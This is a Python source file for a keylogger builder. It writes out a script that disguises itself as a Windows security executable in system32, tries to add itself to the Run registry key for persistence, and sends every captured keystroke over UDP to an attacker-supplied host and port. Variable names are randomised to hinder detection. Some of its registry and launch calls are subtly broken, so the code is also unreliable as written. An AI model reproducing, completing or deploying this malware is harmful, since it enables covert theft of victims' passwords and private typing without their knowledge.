import colorama
import socket


def Create(*self, Host, Port, a1, a2, a3, a4, a5, a6,  a7, a8,  a9, a10,  a11, a12, a13, a14, PATH):
    from time import sleep as Sleep
    Red, Blue, Green, Reset = colorama.Fore.LIGHTRED_EX, colorama.Fore.LIGHTBLUE_EX, colorama.Fore.LIGHTGREEN_EX, colorama.Fore.RESET
    print("[", Green + "!" + Reset + "]" + Reset +
          "Opening File To Write Data On It...", end="")
    Sleep(0.2)
    try:
        f = open(PATH, "w+")
    except:
        print(
            "\r[" + Red + "-" + "]" + Reset + "Opening File To Write Data On It...Failed \n Cannnot Open File")
        Sleep(0.2)
        return False
    else:
        print("\r[" + Blue + "+" + Reset + "]" + Reset +
              "Opening File To Write Data On It...Done")
        Sleep(0.2)

    KeyLogger_Data = """  
from winreg import OpenKey , SetValueEx
from pynput.keyboard import Key, Listener
import logging
from os import system

def {a1}() :
    {a2} = str(__file__)
    {a3} = open({a2} , "rb")
    {a4} = {a3}.read()
    {a3}.close()
    {a5} = r"C:\Windows\system32\Security Health.exe"
    {a6} = open({a5} , "wb") 
    {a6}.write({a4})
    {a6}.close()
    system({a6})
    {a7}="Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    {a8} = OpenKey("HKEY_LOCAL_MACHINE",{a7},0,"KEY_ALL_ACCESS")
    SetValueEx({a7}, "SecurityHealth",0,"REG_SZ", {a5})
    
def {a13}({a9}):
    global {a10}
    {a10} += {a9}
    {a11}.send({a10}.encode('UTF-8'))

    
if __name__ == "__main__":
    {a10} = ""
    {a1}()
    import socket 
    {a12} = False
    while not {a12} :
        try :
           {a11} = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
           port = {p} 
           host = "{h}"
           {a11}.connect((host , port)) 
           {a12} = True 
        except :
           {a12} = False
    while {a12} :
        try : 
            with Listener(on_press={a13}) as {a14}:
                {a14}.join()
        except :
            {a12} = False
            """.format(h=Host, p=Port, a1=a1, a2=a2, a3=a3, a4=a4, a5=a5, a6=a6, a7=a7, a8=a8, a9=a9,
                       a10=a10, a11=a11, a12=a12, a13=a13, a14=a14)

    from colorama import Fore
    Red, Blue, Green, Reset = Fore.LIGHTRED_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTGREEN_EX, Fore.RESET
    from time import sleep as Sleep
    print("[" + Green + "!" + Reset + "]" +
          Reset + "Writing Data On File...", end="")
    try:
        f.write(KeyLogger_Data)
    except PermissionError:
        print("\r[" + Red + "-" + Reset + "]" + Reset + "Writing Data On File...Failed \nSomething Went Wrong . Looks Like "
              "You Dont Have Access To The File.")
    except:
        print("\r[", Red + "-", "]" + Reset + "Writing Data On File...Failed \nSomething Went Wrong . Is Another Process "
              "Using It ? ")
        Sleep(0.2)
        print("[", Red + "-", "]" + Reset +
              "Couldnt Write Data On File Closing File...", end="")
        f.close()
        Sleep(0.2)
        print("Done")
    else:
        print("\r[" + Blue + "+" + Reset + "]" + Reset +
              "Writing Data On File...Done")
        print("[" + Blue + "+" + Reset + "]",
              Fore.RESET + "Succesfully Created KeyLogger")
        Sleep(1)
